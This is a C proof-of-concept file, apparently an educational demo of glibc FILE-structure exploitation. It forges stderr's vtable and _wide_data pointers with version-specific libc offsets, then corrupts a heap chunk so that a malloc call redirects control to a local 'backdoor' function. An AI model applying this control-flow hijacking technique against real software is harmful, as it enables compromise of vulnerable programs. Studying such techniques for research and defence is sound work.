#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<unistd.h>
#include <string.h>

void backdoor()
{
    printf("\033[31m[!] Backdoor is called!\n");
    _exit(0);
}

void main()
{
    // setbuf(stdout, 0);
    // setbuf(stdin, 0);
    // setbuf(stderr, 0);

    char *p1 = calloc(0x200, 1);
    char *p2 = calloc(0x200, 1);
    char *p3 = calloc(0x480, 1);
    // puts("[*] allocate two 0x200 chunks");

    size_t puts_addr = (size_t)&puts;
    // printf("[*] puts address: %p\n", (void *)puts_addr);
    size_t libc_base_addr = puts_addr - 0x835b0;
    // size_t libc_base_addr = puts_addr - 0x80e50;
    // size_t libc_base_addr = puts_addr - 0x84ed0;
    // printf("[*] libc base address: %p\n", (void *)libc_base_addr);

    size_t _IO_2_1_stderr_addr = libc_base_addr + 0x1ff6c0;
    // size_t _IO_2_1_stderr_addr = libc_base_addr + 0x21a6a0;
    // size_t _IO_2_1_stderr_addr = libc_base_addr + 0x219680;
    // printf("[*] _IO_2_1_stderr_ address: %p\n", (void *)_IO_2_1_stderr_addr);

    size_t _IO_wfile_jumps = libc_base_addr + 0x1fd468;
    // size_t _IO_wfile_jumps = libc_base_addr + 0x2160c0;
    // size_t _IO_wfile_jumps = libc_base_addr + 0x21a020;
    // printf("[*] _IO_wfile_jumps address: %p\n", (void *)_IO_wfile_jumps);

    char *stderr2 = (char *)_IO_2_1_stderr_addr;
    // puts("[+] step 1: change stderr->_flags to 0");
    *(size_t *)stderr2 = 0;

    // puts("[+] step 2: change stderr->vtable to _IO_wfile_jumps - 0x60+0x18");
    *(size_t *)(stderr2 + 0xd8) = _IO_wfile_jumps + 0x18 - 0x60;

    // puts("[+] step 3: replace stderr->_wide_data with the allocated chunk p1");
    *(size_t *)(stderr2 + 0xa0) = (size_t)p1;

    // *(size_t *)(stderr2 + 0x88) = (size_t)libc_base_addr + 0x21ba70;
    // *(size_t *)(p3 + 0x88) = (size_t)libc_base_addr + 0x21b730;

    // puts("[+] step 4: set stderr->_wide_data->_wide_vtable with the allocated chunk p2");
    *(size_t *)(p1 + 0xe0) = (size_t)p2;

    // puts("[+] step 5: put backdoor at fake _wide_vtable->_overflow");
    *(size_t *)(p2 + 0x68) = (size_t)(&backdoor);

    // size_t _IO_list_all = (size_t)libc_base_addr + 0x21a680;
    // size_t _IO_list_all = (size_t)libc_base_addr + 0x219660;
    // *(size_t *)_IO_list_all = (size_t)p3;


    // puts("[+] step 6: call fflush(stderr) to trigger backdoor func");
    // fflush(stderr);
    *(size_t *)(p3 + 0x488) = 0x11;
    char *p4 = malloc(0x2000);
}
